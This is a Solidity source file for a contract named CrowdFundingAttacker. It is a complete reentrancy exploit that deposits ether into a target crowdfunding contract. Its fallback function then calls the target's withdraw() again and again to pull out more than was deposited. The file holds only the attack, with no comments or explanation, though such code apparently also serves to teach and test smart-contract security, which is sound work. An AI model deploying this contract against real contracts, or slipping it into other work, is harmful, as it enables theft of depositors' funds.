pragma solidity ^0.4.20;

contract CrowdFundingAttacker{
    address public targetAddress;
    uint8 i = 0;
    
    function CrowdFundingAttacker(address _targetAddress) public{
       targetAddress=_targetAddress;
    }
    
    function deposit() public payable returns (bool){
        return targetAddress.call.value(msg.value)(bytes4(sha3("deposit()")));
    }
    
    function() public payable{
        while(i < 10){
            i++;
            if(targetAddress.call(bytes4(sha3("withdraw()"))) == false) {
                revert();
            }
          
        }
    }
    
    function withdraw() public returns (bool){
        if( targetAddress.call(bytes4(sha3("withdraw()"))) == false ) {
             revert();
        }
        return true;
   } 
   
}